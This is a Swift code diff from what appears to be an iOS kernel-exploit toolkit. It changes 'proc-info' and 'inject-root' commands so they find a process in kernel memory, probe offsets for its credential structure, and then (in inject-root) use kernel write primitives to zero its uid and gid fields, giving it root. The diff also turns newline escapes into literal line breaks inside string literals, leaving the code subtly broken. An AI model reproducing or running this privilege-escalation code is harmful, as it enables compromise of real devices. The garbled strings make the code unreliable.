@@ -229,36 +229,78 @@
           guard mgr.dsready else { return .fail("proc-info: exploit not ready") }
           let arg = rawArg.trimmingCharacters(in: .whitespaces)
           guard !arg.isEmpty else { return .fail("proc-info: usage — proc-info <pid|name>") }
-          guard let p = _findProc(arg: arg, mgr: mgr) else {
+
+          // ── SURGICAL FIX: Use procbypid() for direct lookup instead of forward walk
+          let pid: Int32
+          if let n = Int32(arg) { pid = n }
+          else if let found = ProcessLayer.shared.find(matching: arg.lowercased()).first {
+              pid = found.pid
+          } else {
               return .fail("proc-info: process '\(arg)' not found")
           }
-          let csFlags = _readCSFlags(p)
 
-          // ucred lives in proc_ro, NOT at proc+0x20
-          let proc_ro    = p.procROPtr
-          let ucredROOff = off_proc_ro_p_ucred != 0 ? UInt64(off_proc_ro_p_ucred) : 0x08
-          let ucredPtr   = (proc_ro != 0 && ds_isvalid(proc_ro)) ? ds_kreadptr(proc_ro + ucredROOff) : 0
-          // kauth_cred layout iOS 18: cr_uid @+0x18, cr_gid @+0x1c
-          let ucredUID   = ucredPtr != 0 ? ds_kread32(ucredPtr + 0x18) : 0
-          let ucredGID   = ucredPtr != 0 ? ds_kread32(ucredPtr + 0x1c) : 0
+          let kaddr = procbypid(pid_t(pid))
+          guard kaddr != 0 else {
+              return .fail("proc-info: pid \(pid) not found in kernel allproc")
+          }
+
+          // Dynamic offset probing for proc_ro → ucred
+          let procROOffsets:  [UInt64] = [0x18, 0x20, 0x28, 0x30]
+          let ucredROOffsets: [UInt64] = [0x08, 0x10, 0x18, 0x20]
+          let credBaseOffsets:[UInt64] = [0x18, 0x20]
+
+          var bestProcRO: UInt64 = 0, bestUcred: UInt64 = 0, bestBase: UInt64 = 0x18
+          var bestScore = -1
+
+          for pro in procROOffsets {
+              let proc_ro = ds_kreadptr(kaddr + pro)
+              guard proc_ro != 0, ds_isvalid(proc_ro) else { continue }
+              for uco in ucredROOffsets {
+                  let ucred = ds_kreadptr(proc_ro + uco)
+                  guard ucred != 0, ds_isvalid(ucred) else { continue }
+                  for cBase in credBaseOffsets {
+                      let c_uid = ds_kread32(ucred + cBase)
+                      let c_gid = ds_kread32(ucred + cBase + 0x0C)
+                      let c_ng  = ds_kread32(ucred + cBase + 0x18)
+                      var score = 0
+                      if c_uid < 100_000 { score += 10 }
+                      if c_gid < 100_000 { score += 10 }
+                      if c_ng <= 16 { score += 200 }
+                      else if c_ng > 1000 { score -= 100 }
+                      if score > bestScore {
+                          bestScore = score; bestProcRO = proc_ro
+                          bestUcred = ucred; bestBase = cBase
+                      }
+                  }
+              }
+          }
+
+          let csFlags = _readCSFlags(KProc(kaddr: kaddr, pid: pid, uid: 0, name: "", taskPtr: 0, procROPtr: bestProcRO))
+          let ucredUID = bestUcred != 0 ? ds_kread32(bestUcred + bestBase) : 0
+          let ucredGID = bestUcred != 0 ? ds_kread32(bestUcred + bestBase + 0x0C) : 0
 
           return .ok(String(format:
-              "proc-info: %@ (pid %d)\n" +
-              "  kaddr        : 0x%016llx\n" +
-              "  proc_ro_ptr  : 0x%016llx\n" +
-              "  task_ptr     : 0x%016llx\n" +
-              "  uid (proc)   : %d\n" +
-              "  ucred_ptr    : 0x%016llx\n" +
-              "  ucred_uid    : %d\n" +
-              "  ucred_gid    : %d\n" +
-              "  cs_flags     : 0x%08x\n" +
-              "  cs_flags_str : %@\n",
-              p.name, p.pid, p.kaddr, proc_ro, p.taskPtr,
-              p.uid, ucredPtr, ucredUID, ucredGID,
-              csFlags, _csDescription(csFlags)))
+              "proc-info: %@ (pid %d)
+" +
+              "  kaddr        : 0x%016llx
+" +
+              "  proc_ro_ptr  : 0x%016llx
+" +
+              "  ucred_ptr    : 0x%016llx
+" +
+              "  ucred_uid    : %d
+" +
+              "  ucred_gid    : %d
+" +
+              "  cs_flags     : 0x%08x
+" +
+              "  cs_flags_str : %@
+" +
+              "  probe_score  : %d (dynamic)",
+              arg, pid, kaddr, bestProcRO, bestUcred, ucredUID, ucredGID,
+              csFlags, _csDescription(csFlags), bestScore))
       }
 
-      // ── thread-list <pid|name> ────────────────────────────────────────────────
       OmegaCore.register("thread-list") { rawArg, mgr in
           guard mgr.dsready else { return .fail("thread-list: exploit not ready") }
           let arg = rawArg.trimmingCharacters(in: .whitespaces)
@@ -364,34 +406,82 @@
           guard mgr.dsready else { return .fail("inject-root: exploit not ready") }
           let arg = rawArg.trimmingCharacters(in: .whitespaces)
           guard !arg.isEmpty else { return .fail("inject-root: usage — inject-root <pid|name>") }
-          guard let p = _findProc(arg: arg, mgr: mgr) else {
+
+          // Direct kernel lookup via procbypid (safer than forward walk)
+          let pid: Int32
+          if let n = Int32(arg) { pid = n }
+          else if let found = ProcessLayer.shared.find(matching: arg.lowercased()).first {
+              pid = found.pid
+          } else {
               return .fail("inject-root: process '\(arg)' not found")
           }
-          // ucred is in proc_ro
-          let proc_ro    = p.procROPtr
-          let ucredROOff = off_proc_ro_p_ucred != 0 ? UInt64(off_proc_ro_p_ucred) : 0x08
-          let ucredPtr   = (proc_ro != 0 && ds_isvalid(proc_ro)) ? ds_kreadptr(proc_ro + ucredROOff) : 0
-          guard ucredPtr != 0 else {
-              return .fail("inject-root: ucred null for \(p.name) (proc_ro=0x\(String(format: "%llx", proc_ro)))")
+
+          let kaddr = procbypid(pid_t(pid))
+          guard kaddr != 0 else {
+              return .fail("inject-root: pid \(pid) not found in kernel allproc")
           }
+
+          // ── Dynamic offset probing for ucred ──
+          let procROOffsets:  [UInt64] = [0x18, 0x20, 0x28, 0x30]
+          let ucredROOffsets: [UInt64] = [0x08, 0x10, 0x18, 0x20]
+          let credBaseOffsets:[UInt64] = [0x18, 0x20]
+
+          var bestProcRO: UInt64 = 0, bestUcred: UInt64 = 0, bestBase: UInt64 = 0x18
+          var bestScore = -1
+
+          for pro in procROOffsets {
+              let proc_ro = ds_kreadptr(kaddr + pro)
+              guard proc_ro != 0, ds_isvalid(proc_ro) else { continue }
+              for uco in ucredROOffsets {
+                  let ucred = ds_kreadptr(proc_ro + uco)
+                  guard ucred != 0, ds_isvalid(ucred) else { continue }
+                  for cBase in credBaseOffsets {
+                      let c_uid = ds_kread32(ucred + cBase)
+                      let c_gid = ds_kread32(ucred + cBase + 0x0C)
+                      let c_ng  = ds_kread32(ucred + cBase + 0x18)
+                      var score = 0
+                      if c_uid < 100_000 { score += 10 }
+                      if c_gid < 100_000 { score += 10 }
+                      if c_ng <= 16 { score += 200 }
+                      else if c_ng > 1000 { score -= 100 }
+                      if score > bestScore {
+                          bestScore = score; bestProcRO = proc_ro
+                          bestUcred = ucred; bestBase = cBase
+                      }
+                  }
+              }
+          }
+
+          guard bestUcred != 0 else {
+              return .fail("inject-root: could not locate valid ucred for \(arg)")
+          }
+
+          let ucredPtr = bestUcred
+          let b = bestBase
           let uidOffsets: [(UInt64, String)] = [
-              (0x18, "cr_uid"), (0x1c, "cr_ruid"), (0x20, "cr_svuid"),
-              (0x24, "cr_gid"), (0x28, "cr_rgid"),  (0x2c, "cr_svgid"),
+              (b, "cr_uid"), (b+0x04, "cr_ruid"), (b+0x08, "cr_svuid"),
+              (b+0x0C, "cr_gid"), (b+0x10, "cr_rgid"), (b+0x14, "cr_svgid"),
           ]
           var results = [String]()
           for (off, fname) in uidOffsets {
               let old = ds_kread32(ucredPtr + off)
               ds_kwrite32(ucredPtr + off, 0)
-              let rb  = ds_kread32(ucredPtr + off)
+              let rb = ds_kread32(ucredPtr + off)
               results.append(String(format: "  %@: %u → %u %@", fname, old, rb, rb == 0 ? "✔" : "✖"))
           }
-          return .ok("inject-root: \(p.name) (pid \(p.pid))\n" +
-                     "  proc_ro_ptr : " + String(format: "0x%016llx\n", proc_ro) +
-                     "  ucred_ptr   : " + String(format: "0x%016llx\n", ucredPtr) +
-                     results.joined(separator: "\n") + "\n")
+          return .ok("inject-root: \(arg) (pid \(pid))
+" +
+                     "  proc_ro_ptr : " + String(format: "0x%016llx
+", bestProcRO) +
+                     "  ucred_ptr   : " + String(format: "0x%016llx
+", ucredPtr) +
+                     "  layout      : score=\(bestScore) (dynamic probe)
+" +
+                     results.joined(separator: "
+") + "
+")
       }
 
-      // ── pivot-status ──────────────────────────────────────────────────────────
       OmegaCore.register("pivot-status") { _, mgr in
           guard mgr.dsready else { return .fail("pivot-status: exploit not ready") }
           let uid = getuid(); let isRoot = uid == 0
